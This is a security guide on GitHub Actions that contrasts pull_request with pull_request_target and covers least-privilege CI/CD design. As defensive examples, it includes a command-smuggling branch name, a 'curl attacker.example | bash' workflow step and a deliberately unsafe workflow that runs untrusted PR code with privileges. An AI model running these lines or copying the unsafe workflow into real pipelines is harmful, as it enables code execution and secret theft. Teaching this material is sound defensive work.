# 09- pull_request vs pull_request_target

## Overview

GitHub Actions pull-request workflows operate across an important trust boundary: the pull request may contain code controlled by a contributor who should not automatically receive access to repository secrets, privileged tokens, cloud credentials, protected environments, or internal infrastructure.

The two events most often confused in this context are:

- `pull_request`
- `pull_request_target`

They may appear similar because both respond to pull-request activity, but they execute with different security contexts and are intended for different classes of automation.

The fundamental distinction is:

```text
pull_request
    ↓
Run CI against pull-request code
    ↓
Treat code as untrusted

pull_request_target
    ↓
Run workflow in the base repository context
    ↓
Can access trusted repository resources
    ↓
Must NOT execute untrusted PR code with those privileges
```

A production GitHub Actions architecture should therefore treat the event choice as a security decision, not merely a trigger configuration.

## The Pull Request Trust Boundary

A pull request can change executable content.

For a Python backend, a contributor may modify:

```text
application code
tests
requirements.txt
pyproject.toml
Dockerfile
shell scripts
Makefile
workflow files
```

CI may then execute that content through:

```bash
pip install -r requirements.txt
pytest
python manage.py test
docker build .
```

Therefore:

```text
Pull Request
     ↓
Potentially untrusted code
     ↓
CI runner
```

must be treated as an execution boundary.

The risk becomes much larger if the runner also has:

```text
Production secrets
AWS credentials
OIDC access
Private network access
Write permissions
Persistent filesystem state
Docker privileges
```

The goal is to prevent this:

```text
Untrusted PR
     ↓
Privileged Workflow
     ↓
Production Resources
```

and instead establish:

```text
Untrusted PR
     ↓
Restricted CI
     ↓
Trusted Branch
     ↓
Privileged Deployment
```

## `pull_request`

`pull_request` is primarily designed for CI associated with pull requests.

Example:

```yaml
name: Pull Request CI

on:
  pull_request:

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Install dependencies
        run: pip install -r requirements.txt

      - name: Run tests
        run: pytest
```

This is the normal model for:

- Linting.
- Unit tests.
- Integration tests.
- API tests.
- Static analysis.
- Dependency checks.
- Coverage.
- Build validation.

The important property is that pull-request code is treated as untrusted.

## What `pull_request` Represents

Conceptually:

```text
Contributor
    ↓
Pull Request
    ↓
pull_request
    ↓
Restricted CI
    ↓
Test Results
```

The workflow validates the proposed change without granting it production-level authority.

This makes `pull_request` a natural choice for ordinary CI.

## Fork Pull Requests

Fork pull requests require particular attention.

Consider:

```text
Developer Fork
      ↓
Pull Request
      ↓
Organization Repository
      ↓
GitHub Actions
```

The contributor controls the code in the fork.

That code may attempt to:

- Read environment variables.
- Access files.
- Execute shell commands.
- Modify build behavior.
- Alter dependency installation.
- Abuse permissions.
- Exfiltrate credentials if credentials are available.

Therefore fork PRs should be considered untrusted execution.

## Secrets and `pull_request`

A normal pull-request validation workflow should not depend on production secrets.

For example, this is a poor design:

```yaml
jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - run: pytest
        env:
          DATABASE_PASSWORD: ${{ secrets.PRODUCTION_DATABASE_PASSWORD }}
```

The test job has no legitimate reason to require a production database password.

Instead, use an isolated CI database:

```text
PR
 ↓
GitHub Runner
 ├── Application
 ├── PostgreSQL Test Database
 └── Redis Test Instance
```

## `pull_request_target`

`pull_request_target` runs in the context of the base repository.

This distinction is important because it can allow access to repository-level resources that ordinary fork PR workflows should not receive.

A simplified model is:

```text
Pull Request
     ↓
pull_request_target
     ↓
Base Repository Context
     ↓
Potentially privileged workflow
```

This can be useful for trusted automation involving pull-request metadata.

However, it creates a serious security risk if the workflow checks out and executes attacker-controlled pull-request code.

## Why `pull_request_target` Exists

There are legitimate cases where a workflow needs to operate with base-repository privileges without executing the contributor's code.

Examples include controlled automation around:

- Pull-request labels.
- Pull-request comments.
- Metadata processing.
- Repository-maintainer automation.
- Other trusted operations that do not require executing PR code.

The key distinction is:

> `pull_request_target` can be appropriate for trusted automation around a PR, but it must not become a privileged execution environment for the PR itself.

## The Dangerous Pattern

Consider:

```yaml
name: PR Validation

on:
  pull_request_target:

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout PR
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Install dependencies
        run: pip install -r requirements.txt

      - name: Run tests
        run: pytest
```

The workflow has combined:

```text
Base Repository Context
        +
PR-Controlled Code
        +
Code Execution
```

This is the critical security problem.

A malicious PR can modify:

```text
requirements.txt
pytest configuration
application code
shell scripts
Dockerfile
```

and potentially execute code with privileges available to the `pull_request_target` workflow.

## The Security Equation

The dangerous combination can be expressed as:

```text
Privileged Context
+
Untrusted Checkout
+
Code Execution
=
Potential Privilege Escalation
```

The event itself is not inherently dangerous.

The dangerous design is allowing untrusted code to execute inside the privileged context.

## Safe `pull_request_target` Pattern

A safer pattern processes metadata without checking out the PR code.

For example:

```yaml
name: PR Metadata

on:
  pull_request_target:
    types:
      - opened
      - synchronize
      - labeled

permissions:
  contents: read
  pull-requests: write

jobs:
  label:
    runs-on: ubuntu-latest

    steps:
      - name: Inspect pull request metadata
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          printf 'Pull request title: %s\n' "$PR_TITLE"
```

The workflow does not:

```text
checkout PR code
install PR dependencies
execute PR tests
build PR Docker image
run PR scripts
```

The workflow operates on controlled metadata instead.

## Direct Comparison

| Characteristic | `pull_request` | `pull_request_target` |
|---|---|---|
| Primary purpose | PR CI | Trusted PR-related automation |
| Execution context | PR workflow context | Base repository context |
| PR code | Potentially untrusted | Must remain untrusted |
| Fork PR support | Normal use case | Requires particular caution |
| Secrets | Should not be relied upon | May be available depending on configuration |
| Privileged operations | Generally inappropriate | Possible, but must be tightly controlled |
| Checkout of PR code | Normal for CI | Dangerous when privileged execution is possible |
| Metadata automation | Possible | Common use case |
| Production deployment | Should not occur directly | Should still require separate trusted controls |

## The Most Important Rule

Do not reason about these events as:

```text
pull_request = unsafe
pull_request_target = safe
```

That is incorrect.

Instead reason about:

```text
What code is executed?
+
Under which security context?
+
With which permissions?
+
With which secrets?
+
On which runner?
```

A `pull_request_target` workflow becomes dangerous when it executes untrusted code.

## Workflow Context

GitHub Actions provides contextual information through objects such as:

```text
github
env
vars
secrets
steps
needs
job
runner
matrix
strategy
inputs
```

For pull requests, useful values include:

```yaml
${{ github.event.pull_request.title }}
${{ github.event.pull_request.body }}
${{ github.event.pull_request.head.sha }}
${{ github.event.pull_request.base.sha }}
${{ github.event.pull_request.head.ref }}
${{ github.event.pull_request.base.ref }}
${{ github.event.pull_request.head.repo.full_name }}
```

These values should be treated according to their trust level.

## PR Metadata Is Also Untrusted

Changing from `pull_request` to `pull_request_target` does not make PR metadata trustworthy.

For example:

```yaml
${{ github.event.pull_request.title }}
```

is contributor-controlled data.

Avoid:

```yaml
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

Prefer:

```yaml
- name: Process PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    printf '%s\n' "$PR_TITLE"
```

The same principle applies to:

- Branch names.
- Commit messages.
- PR body.
- User-provided inputs.

## Shell Injection

Suppose a contributor creates a branch named:

```text
feature/$(curl attacker.example)
```

Direct interpolation into shell syntax is dangerous.

Avoid:

```yaml
- run: echo "${{ github.head_ref }}"
```

Prefer:

```yaml
- name: Inspect branch
  env:
    BRANCH_NAME: ${{ github.head_ref }}
  run: |
    printf '%s\n' "$BRANCH_NAME"
```

For scripts, quote the argument:

```bash
./validate-branch.sh "$BRANCH_NAME"
```

## Python Automation

The same security boundary exists in Python.

Avoid:

```python
import subprocess

branch = input_value

subprocess.run(
    f"./validate.sh {branch}",
    shell=True,
    check=True,
)
```

Prefer:

```python
import subprocess

branch = input_value

subprocess.run(
    ["./validate.sh", branch],
    check=True,
)
```

If the value represents a controlled choice, validate it:

```python
ALLOWED_ENVIRONMENTS = {"staging", "production"}

if environment not in ALLOWED_ENVIRONMENTS:
    raise ValueError("Unsupported environment")
```

## Secrets

A common motivation for using `pull_request_target` is access to secrets.

That does not make it appropriate for testing PR code.

A better architecture separates the workflows:

```text
PR
 ↓
pull_request
 ↓
Restricted Tests
 ↓
Merge
 ↓
Trusted Main
 ↓
Deployment Workflow
 ↓
Protected Environment
 ↓
Secrets / OIDC
```

This preserves the trust boundary instead of bypassing it.

## GITHUB_TOKEN Permissions

Always minimize permissions.

For ordinary PR validation:

```yaml
permissions:
  contents: read
```

A metadata workflow that needs to modify pull requests can use narrower permissions:

```yaml
permissions:
  contents: read
  pull-requests: write
```

Do not grant:

```yaml
permissions: write-all
```

as a shortcut.

## Job-Level Permissions

Permissions should be scoped to the smallest job that requires them.

```yaml
permissions:
  contents: read

jobs:
  test:
    permissions:
      contents: read

  label:
    permissions:
      contents: read
      pull-requests: write
```

This limits the blast radius if a particular job is compromised.

## OIDC and `pull_request_target`

OIDC is especially sensitive because it can allow GitHub Actions to obtain short-lived cloud credentials.

A job might request:

```yaml
permissions:
  id-token: write
```

That permission should not be casually added to pull-request workflows.

A safer architecture is:

```text
PR
 ↓
pull_request
 ↓
Tests
 ↓
No id-token: write

Trusted Main
 ↓
Deployment
 ↓
id-token: write
 ↓
AWS STS
 ↓
Restricted IAM Role
```

## AWS Deployment Boundary

A production deployment should not be directly triggered by arbitrary PR code.

Instead:

```mermaid
flowchart LR
    PR[Pull Request] --> CI[pull_request CI]
    CI --> Merge[Protected Main]
    Merge --> Build[Trusted Build]
    Build --> Image[Immutable Docker Image]
    Image --> ECR[ECR]
    ECR --> Stage[Staging]
    Stage --> Approval[Production Approval]
    Approval --> OIDC[GitHub OIDC]
    OIDC --> STS[AWS STS]
    STS --> IAM[Restricted IAM Role]
    IAM --> Prod[Production]
```



This provides separate trust zones.

## Environment Protection

Production deployment should be attached to a protected environment where appropriate:

```yaml
jobs:
  deploy:
    environment:
      name: production
```

Environment protection can provide:

- Required reviewers.
- Deployment restrictions.
- Environment secrets.
- Deployment history.

A pull-request validation job should not automatically inherit production environment privileges.

## Reusable Workflows

Reusable workflows create another security boundary.

Consider:

```yaml
jobs:
  deploy:
    uses: organization/platform-workflows/.github/workflows/deploy.yml@v1
```

Before allowing a PR-controlled workflow to invoke a privileged reusable workflow, verify:

- Who can modify the caller.
- Who can modify the reusable workflow.
- Which permissions are granted.
- Which secrets are passed.
- Which environment is targeted.
- Whether untrusted inputs influence deployment behavior.

A reusable workflow should not become a privilege-escalation path.

## `secrets: inherit`

Using:

```yaml
secrets: inherit
```

should be deliberate.

It can simplify reusable workflows but can also expose more secrets than a workflow actually needs.

Prefer explicit secrets when practical:

```yaml
jobs:
  deploy:
    uses: organization/platform/.github/workflows/deploy.yml@v1
    secrets:
      deployment_token: ${{ secrets.DEPLOYMENT_TOKEN }}
```

## Pull Request Workflows and Docker

A PR may modify a Dockerfile:

```dockerfile
RUN curl ...
RUN pip install ...
RUN python setup.py ...
```

Therefore:

```bash
docker build .
```

is an execution boundary.

Do not combine a PR-controlled Docker build with:

- Production credentials.
- Host-mounted credential directories.
- Privileged Docker access.
- Production network access.

## Self-Hosted Runners

Self-hosted runners require additional caution.

A persistent runner may retain:

```text
Source files
Docker layers
Credentials
Caches
Temporary files
Build outputs
```

A malicious PR can potentially abuse that persistent state.

Avoid running untrusted fork PRs on privileged persistent runners.

## Ephemeral Runners

Ephemeral runners reduce persistent state:

```text
Provision
   ↓
Run CI
   ↓
Collect results
   ↓
Destroy
```

This is particularly useful when private infrastructure is unavoidable.

However, ephemeral infrastructure does not make untrusted code trusted.

The workflow must still enforce:

- Least privilege.
- Network restrictions.
- Secret isolation.
- Appropriate runner permissions.

## Runner Network Access

A runner that can reach:

```text
Production Database
Internal APIs
Private Kubernetes API
Internal Redis
Kafka
AWS Private Services
```

has a larger blast radius.

PR CI should normally operate without production network access.

If private network access is required for testing, provide isolated test resources instead.

## Third-Party Actions

Third-party actions are executable dependencies.

A workflow such as:

```yaml
- uses: third-party/example-action@v1
```

should be evaluated for:

- Source ownership.
- Release history.
- Dependency chain.
- Required permissions.
- Secret access.
- Network access.
- Versioning.
- Maintenance status.

For sensitive workflows, immutable SHA pinning provides stronger integrity than mutable version tags.

## Action Supply Chain

The trust chain can be represented as:

```text
Workflow
   ↓
Third-Party Action
   ↓
Action Dependencies
   ↓
Runner
   ↓
Secrets / Token
   ↓
External Systems
```

A compromised action can potentially inherit the privileges of the workflow.

Therefore the workflow must minimize permissions even when actions are trusted.

## Branch Protection

Protect the transition from untrusted PR to trusted main.

Typical controls include:

- Required reviews.
- Required status checks.
- Restricted branch deletion.
- Restricted force pushes.
- CODEOWNERS for sensitive files.
- Protected workflow changes.

Critical paths include:

```text
.github/workflows/
.github/actions/
infra/
terraform/
Dockerfile
deployment/
```

## CODEOWNERS

Sensitive CI/CD files should receive appropriate review.

For example:

```text
.github/workflows/ @platform-team
.github/actions/ @platform-team
infra/ @platform-team
terraform/ @platform-team
```

The exact ownership structure depends on the organization.

## Pull Request Workflow Changes

A pull request can attempt to modify:

```yaml
permissions:
  contents: write
```

or:

```yaml
- run: curl attacker.example | bash
```

or:

```yaml
- run: env
```

This is why workflow files should be treated as security-sensitive code.

A pull request changing CI/CD configuration deserves the same security reasoning as a pull request changing application authentication logic.

## Approval Gates

Manual approval should occur after trusted validation.

Prefer:

```text
PR
 ↓
CI
 ↓
Merge
 ↓
Trusted Build
 ↓
Staging
 ↓
Validation
 ↓
Production Approval
 ↓
Production
```

rather than:

```text
PR
 ↓
Privileged Workflow
 ↓
Production
```

Approval is an additional control, not a substitute for least privilege.

## Build Once, Promote the Same Artifact

A secure production architecture should avoid rebuilding source code separately for every environment.

Prefer:

```text
Trusted Main
     ↓
Build
     ↓
Immutable Artifact
     ↓
Staging
     ↓
Production
```

For Docker:

```text
Git SHA
  ↓
Docker Build
  ↓
Image tagged with commit SHA
  ↓
ECR
  ↓
Staging
  ↓
Production
```

The artifact tested in staging should be the artifact promoted to production.

## Artifact Integrity

Production artifacts should be traceable to:

- Trusted source.
- Trusted workflow.
- Expected commit.
- Expected build.
- Expected image digest.

Additional controls may include:

- SBOM.
- Artifact attestations.
- Signing.
- Registry policies.
- Vulnerability scanning.

## Pull Request Concurrency

Pull-request validation can use concurrency to avoid wasting resources on obsolete commits:

```yaml
concurrency:
  group: pr-${{ github.event.pull_request.number }}
  cancel-in-progress: true
```

This is useful when multiple commits are pushed rapidly.

For production deployment, the policy is usually different:

```yaml
concurrency:
  group: production
  cancel-in-progress: false
```

The deployment should not be cancelled halfway through merely because another workflow started.

## Production Architecture

A mature architecture separates trust zones:

```text
                    ┌──────────────────────┐
                    │    Pull Request      │
                    │    Untrusted Code    │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │   pull_request CI    │
                    │  Minimal Permissions  │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Protected Main Branch│
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │    Trusted Build     │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Immutable Artifact   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │      Staging         │
                    └──────────┬───────────┘
                               │
                         Approval
                               │
                               ▼
                    ┌──────────────────────┐
                    │    Production        │
                    │ OIDC + Restricted IAM│
                    └──────────────────────┘
```

## Failure Domains

Treat each layer as a separate failure domain.

| Layer | Trust Level | Typical Controls |
|---|---|---|
| Fork PR | Untrusted | Restricted CI |
| PR workflow | Restricted | Minimal permissions |
| Main branch | Trusted after protection | Required reviews |
| Build | Trusted | Controlled workflow |
| Artifact | Verified | Immutable digest |
| Staging | Controlled | Isolated environment |
| Production | Highly privileged | Approval + OIDC + IAM |

The objective is to prevent compromise in one layer from automatically crossing into the next.

## Troubleshooting

Use:

```text
Symptom
→ Possible Causes
→ Isolation Strategy
→ Commands / Checks
→ Root Cause
→ Corrective Action
→ Prevention
```

### `pull_request_target` Can Access a Secret

**Possible causes**

- Workflow runs in base repository context.
- Secret is explicitly referenced.
- Production environment is attached.
- Reusable workflow inherits secrets.

**Isolation**

Inspect:

```yaml
permissions:
environment:
secrets:
```

and reusable workflow calls.

### PR Code Is Executing With Secrets

**Possible causes**

- `pull_request_target` checks out PR code.
- Privileged reusable workflow is called.
- Deployment job is reachable from PR-controlled data.

**Corrective action**

Separate:

```text
PR validation
```

from:

```text
privileged deployment
```

### AWS OIDC Is Available to PR CI

Inspect:

```yaml
permissions:
  id-token: write
```

Then trace:

```text
Workflow
 ↓
OIDC Token
 ↓
AWS STS
 ↓
IAM Trust Policy
 ↓
IAM Permissions
```

If PR code can reach the OIDC path, reassess the trust boundary.

### PR Workflow Runs on the Wrong Runner

Inspect:

```yaml
runs-on:
```

and organization runner groups.

Determine whether the selected runner provides:

- Private network access.
- Persistent storage.
- Cloud credentials.
- Docker privileges.

### `pull_request_target` Workflow Does Not Have PR Files

This may be intentional.

If the workflow is designed for trusted metadata processing, it should not necessarily check out PR code.

If actual PR code needs testing, use an appropriately restricted `pull_request` workflow.

### PR Metadata Causes Script Failure

Treat metadata as data:

```yaml
env:
  INPUT: ${{ github.event.pull_request.title }}
```

then process it with:

```bash
./script.sh "$INPUT"
```

and validate the value according to the expected format.

## GitHub CLI Diagnostics

List workflow runs:

```bash
gh run list
```

Inspect a run:

```bash
gh run view RUN_ID
```

View logs:

```bash
gh run view RUN_ID --log
```

List workflows:

```bash
gh workflow list
```

Inspect repository Actions permissions:

```bash
gh api repos/{owner}/{repo}/actions/permissions
```

Inspect workflow permissions:

```bash
gh api repos/{owner}/{repo}/actions/permissions/workflow
```

List environments:

```bash
gh api repos/{owner}/{repo}/environments
```

List repository secrets without revealing values:

```bash
gh secret list
```

## Incident Response

If a `pull_request_target` workflow has executed untrusted code with privileged access:

1. Stop affected deployments.
2. Identify the workflow run.
3. Identify the PR and commit.
4. Determine whether the PR originated from a fork.
5. Inspect the workflow revision.
6. Determine the workflow permissions.
7. Determine which secrets were accessible.
8. Determine whether OIDC was available.
9. Identify any AWS roles assumed.
10. Review cloud audit logs.
11. Rotate potentially exposed credentials.
12. Review runner state.
13. Review artifacts and caches.
14. Remove the unsafe execution path.
15. Rebuild from a trusted commit.
16. Revalidate production artifacts.
17. Restore deployment capability using known-good artifacts.

## Security Checklist

### `pull_request`

- [ ] Used for ordinary PR CI.
- [ ] PR code is treated as untrusted.
- [ ] Fork PRs are supported without production secrets.
- [ ] Minimal `GITHUB_TOKEN` permissions are configured.
- [ ] Test infrastructure is isolated.
- [ ] Production deployment is not directly reachable.

### `pull_request_target`

- [ ] Use case is explicitly documented.
- [ ] PR code is not checked out for privileged execution.
- [ ] PR-controlled scripts are not executed.
- [ ] Secrets are limited to the smallest required scope.
- [ ] Permissions are minimized.
- [ ] OIDC is not unnecessarily available.
- [ ] Production environments are not attached unnecessarily.

### Untrusted Input

- [ ] PR titles are treated as untrusted.
- [ ] Branch names are treated as untrusted.
- [ ] Commit messages are treated as untrusted.
- [ ] PR bodies are treated as untrusted.
- [ ] Environment variables are used for shell data.
- [ ] Shell arguments are quoted.
- [ ] `eval` is avoided.
- [ ] Dynamic shell construction is avoided.
- [ ] Python avoids unnecessary `shell=True`.
- [ ] Sensitive choices use allowlists.

### Runners

- [ ] Fork PRs do not run on privileged persistent runners.
- [ ] Runner groups enforce trust boundaries.
- [ ] Private network access is restricted.
- [ ] Ephemeral runners are considered for sensitive workloads.
- [ ] Runner state is not trusted after untrusted execution.

### AWS

- [ ] Production credentials are not available to PR CI.
- [ ] OIDC is restricted to trusted deployment jobs.
- [ ] IAM trust policies are narrowly scoped.
- [ ] IAM permissions follow least privilege.
- [ ] CloudTrail or equivalent audit logging is available.
- [ ] Credentials can be rotated quickly.

### Deployment

- [ ] Main branch is protected.
- [ ] CI/CD workflow changes receive appropriate review.
- [ ] Production uses a protected environment.
- [ ] Deployment concurrency prevents races.
- [ ] Immutable artifacts are promoted.
- [ ] Rollback uses a known-good artifact.

## Common Mistakes

### Treating `pull_request_target` as a Safer Version of `pull_request`

It is not.

Its base-repository execution context can make misuse more dangerous.

### Checking Out the PR in `pull_request_target`

This is the most important mistake to avoid.

The combination of:

```text
pull_request_target
+
PR checkout
+
Code execution
+
Secrets
```

can cross the intended trust boundary.

### Using Production Secrets to Run PR Tests

If tests require production credentials, the architecture should be reconsidered.

Use isolated test infrastructure instead.

### Giving PR Jobs `id-token: write`

OIDC is a powerful cloud authentication mechanism and should be restricted to jobs that genuinely need it.

### Running PR Code on Privileged Self-Hosted Runners

A private network or persistent filesystem can significantly increase the impact of a compromised PR.

### Trusting PR Metadata

Branch names, titles, commit messages, and PR bodies are contributor-controlled input.

### Assuming a Protected Branch Solves Everything

Branch protection controls how code enters a trusted branch.

It does not automatically secure the execution of an untrusted PR.

## Interview Questions

### What Is the Difference Between `pull_request` and `pull_request_target`?

Explain:

- Execution context.
- Trust boundaries.
- Fork behavior.
- Secret exposure.
- Typical use cases.
- Why `pull_request_target` requires caution.

### Why Is `pull_request_target` Dangerous With Checkout?

Explain the sequence:

```text
Privileged Base Context
        ↓
Checkout Attacker-Controlled Commit
        ↓
Execute Tests / Scripts
        ↓
Access Privileged Resources
```

### How Would You Secure a Django PR Pipeline?

Requirements:

- Python 3.11 and 3.12.
- PostgreSQL.
- Redis.
- pytest.
- Coverage.
- Fork PR support.

A reasonable architecture is:

```text
pull_request
      ↓
GitHub-hosted Runner
      ↓
PostgreSQL + Redis
      ↓
pytest
      ↓
Coverage
      ↓
Artifacts
```

No production credentials are required.

### How Would You Deploy to AWS?

Use:

```text
Protected Main
      ↓
Trusted Build
      ↓
Docker Image
      ↓
ECR
      ↓
Staging
      ↓
Approval
      ↓
GitHub OIDC
      ↓
AWS STS
      ↓
Restricted IAM Role
      ↓
Production
```

### How Would You Handle a Private Network Requirement?

Do not simply run arbitrary fork PRs on a persistent production-connected runner.

Instead consider:

- Isolated test environments.
- Dedicated runner groups.
- Ephemeral runners.
- Network segmentation.
- Minimal IAM.
- Restricted security groups.
- No production credentials.

### How Do You Prevent Script Injection?

Use:

```yaml
env:
  INPUT: ${{ github.event.pull_request.title }}
```

and:

```bash
./script.sh "$INPUT"
```

Then validate the input according to its intended semantics.

### How Would You Investigate a Compromised `pull_request_target` Workflow?

Trace:

```text
PR
 ↓
Workflow
 ↓
Checkout
 ↓
Permissions
 ↓
Secrets
 ↓
OIDC
 ↓
IAM
 ↓
Cloud Resources
```

Then inspect logs, cloud audit events, runner state, artifacts, and credential exposure.

## Key Takeaways

- `pull_request` is the normal event for validating potentially untrusted pull-request code; keep its permissions and infrastructure restricted.
- `pull_request_target` operates in the base-repository context and can support trusted PR metadata automation, but it becomes dangerous when combined with checkout or execution of PR-controlled code.
- The critical security question is not which event is inherently safe; it is which code executes, under which context, with which permissions, secrets, runner access, and cloud privileges.
- Separate PR validation from privileged deployment using protected branches, isolated runners, least-privilege permissions, protected environments, OIDC, restricted IAM, and immutable artifact promotion.
- Treat pull-request metadata, workflow changes, dependencies, Dockerfiles, scripts, and third-party actions as potential attack surfaces and design the CI/CD trust boundaries accordingly.